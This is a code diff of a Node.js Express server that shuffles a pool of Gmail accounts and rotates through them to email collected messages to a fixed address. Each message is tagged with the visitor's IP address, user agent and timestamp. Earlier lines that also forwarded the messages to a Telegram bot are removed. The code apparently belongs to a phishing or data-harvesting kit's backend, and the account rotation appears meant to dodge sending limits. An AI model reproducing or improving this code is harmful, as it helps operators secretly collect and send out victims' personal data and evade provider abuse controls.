@@ -55,17 +55,22 @@ app.get("/", (req, res) => {
   res.end("Welcome to my simple API");
 });
 
+const shuffleArray = (array) => {
+  return array.sort(() => Math.random() - 0.5);
+};
+
 // Modified sendEmailWithRotation function
 const sendEmailWithRotation = (req, subject, message, callback) => {
   let attempt = 0;
+  const shuffledAccounts = shuffleArray([...gmailAccounts]); // Randomize accounts
 
   const tryNextAccount = () => {
-    if (attempt >= gmailAccounts.length) {
+    if (attempt >= shuffledAccounts.length) {
       console.log("All Gmail accounts have been tried, email sending failed.");
       return callback("Failed to send email", null);
     }
 
-    const { user, pass } = gmailAccounts[attempt];
+    const { user, pass } = shuffledAccounts[attempt];
     const transporter = nodemailer.createTransport({
       service: "gmail",
       auth: { user, pass },
@@ -75,14 +80,23 @@ const sendEmailWithRotation = (req, subject, message, callback) => {
     const userAgent = req.headers["user-agent"];
     const timestamp = new Date().toISOString();
 
-    // Build the email message, including the Telegram message
-    const fullMessage = `\n${message}\n\n=======================\nAdditional Information\n=======================\n\nIP Address:\n${ipAddress}\n\nBrowser:\n${userAgent}\n\nTimestamp:\n${timestamp}\n\n_Good luck!_`;
-    
+    const fullMessage = `
+      ${message}
+      <br><br>=======================
+      <br><strong>Additional Information</strong>
+      <br>=======================
+      <br><strong>IP Address:</strong> ${ipAddress}
+      <br><strong>Browser:</strong> ${userAgent}
+      <br><strong>Timestamp:</strong> ${timestamp}
+      <br><em>Good luck!</em>
+    `;
+
     const mailOptions = {
       from: user,
       to: "hey.heatherw@outlook.com",
       subject: subject,
-      text: fullMessage,
+      text: fullMessage.replace(/<br>/g, "\n"), // Convert HTML to plain text for email
+      html: fullMessage, // Use HTML format
     };
 
     transporter.sendMail(mailOptions, (error, info) => {
@@ -92,28 +106,14 @@ const sendEmailWithRotation = (req, subject, message, callback) => {
         tryNextAccount();
       } else {
         console.log(`Email successfully sent using ${user}.`);
-
-        const escapeMarkdown = (text) => {
-          return text.replace(/[_*[\]()~`>#+-=|{}.!]/g, "\\$&");
-        };
-
-        const formattedMessage = escapeMarkdown(`Subject: ${subject}\n\n${fullMessage}`);
-
-        telegramBot
-          .sendMessage(chatId, formattedMessage, {
-            parse_mode: "MarkdownV2",
-          })
-          .then(() => callback(null, { message: "Success", info }))
-          .catch((telegramError) => {
-            console.error("Failed to send Telegram message:", telegramError.message);
-            callback("Telegram message failed", null);
-          });
+        callback(null, { message: "Success", info });
       }
     });
   };
 
   tryNextAccount();
 };
+
 
 
 app.get("/location", async (req, res) => {
